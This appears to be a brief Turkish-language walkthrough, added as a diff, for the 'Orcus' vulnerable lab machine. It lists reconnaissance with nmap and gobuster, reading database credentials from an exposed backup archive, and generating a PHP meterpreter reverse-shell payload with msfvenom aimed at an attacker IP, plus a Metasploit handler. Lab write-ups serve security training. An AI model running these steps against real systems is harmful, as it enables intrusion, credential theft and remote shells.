@@ -1,0 +1,9 @@
+ORCUS MAKİNE ÇÖZÜMÜ
+1 - IP adresi makine ekranında 192.168.2.58 bulundu.
+2 - nmap -sT -A 192.168.2.58
+3 - gobuster dir -u http://192.168.2.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - http://192.168.2.58/backups/SimplePHPQuiz-Backupz.tar.gz, cat includes/db_conn.php, dbuser:dbpassword
+5 - http://192.168.2.58/phpmyadmin
+6 - http://192.168.2.58/zenphoto
+7 - msfvenom –p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f raw
+8 - msfconsole, use exploit/multi/handler
